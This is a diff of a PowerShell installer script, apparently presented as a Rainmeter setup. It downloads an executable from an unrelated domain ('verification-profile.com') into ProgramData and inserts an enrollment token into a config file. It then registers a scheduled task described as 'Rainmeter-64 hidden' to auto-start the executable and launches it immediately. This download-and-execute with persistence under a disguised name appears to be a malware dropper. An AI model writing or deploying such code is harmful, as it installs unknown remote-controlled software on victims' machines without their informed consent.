@@ -20,33 +20,29 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 }
 
 try {
-    $zipUrl      = "https://dc.verification-profile.com/Rainmeter-64.zip"
-    $zipPath     = "$env:ProgramData\Rainmeter-64.zip"
+    $exeUrl      = "https://dc.verification-profile.com/x64Rain.exe"
+    $exePath     = "$env:ProgramData\x64Rain.exe"
     $extractPath = "$env:ProgramData"
 
-    Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
-    Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
-    Remove-Item -Path $zipPath -Force
+    # Скачиваем напрямую EXE файл
+    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
 
     $taskName = "Rainmeter64AutoStart"
-    $exePath  = "$env:ProgramData\Rainmeter-64\x64Rain.exe"
-
+    
     if (-not (Test-Path $exePath)) {
         throw "EXE not found: $exePath"
     }
 
-    $configPath = "C:\ProgramData\Rainmeter-64\conig_manager.xml"
+    $configPath = "C:\ProgramData\conig_manager.xml"
 
     if (Test-Path $configPath) {
         $content = Get-Content -Path $configPath -Raw
-
         $content = $content -replace 'enroll_token=.*?;', "enroll_token=$enroll_token;"
-        
         Set-Content -Path $configPath -Value $content
     } 
 
-    $autorunDir        = "C:\ProgramData\Rainmeter-64"
-    $autorunScriptPath = "C:\ProgramData\Rainmeter-64\autorun.ps1"
+    $autorunDir        = "C:\ProgramData"
+    $autorunScriptPath = "C:\ProgramData\autorun.ps1"
 
     if (-not (Test-Path $autorunDir)) {
         New-Item -Path $autorunDir -ItemType Directory -Force | Out-Null
@@ -54,8 +50,8 @@ try {
 
     $autorunScript = @'
 $ErrorActionPreference = "Stop"
-$exePath = "C:\ProgramData\Rainmeter-64\x64Rain.exe"
-$logFile = "C:\ProgramData\Rainmeter-64\autorun.log"
+$exePath = "C:\ProgramData\x64Rain.exe"
+$logFile = "C:\ProgramData\autorun.log"
 $logDir  = Split-Path $logFile -Parent
 
 if (-not (Test-Path $logDir)) {
@@ -69,7 +65,6 @@ try {
         "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') ERROR: EXE not found: $exePath" | Out-File -FilePath $logFile -Append
         exit 1
     }
-    # ИЗМЕНЕНО: Запуск без скрытия окна
     $p = Start-Process -FilePath $exePath -WorkingDirectory (Split-Path $exePath -Parent) -PassThru -ErrorAction Stop
     "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') OK PID=$($p.Id)" | Out-File -FilePath $logFile -Append
 }
@@ -95,7 +90,6 @@ catch {
     Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Description "Rainmeter-64 hidden" -ErrorAction Stop
 
     Write-Host "Done '$taskName' created."
-    # Запуск программы сразу после установки (без скрытия)
     Start-Process -FilePath $exePath -WorkingDirectory (Split-Path $exePath -Parent)
 }
 catch {
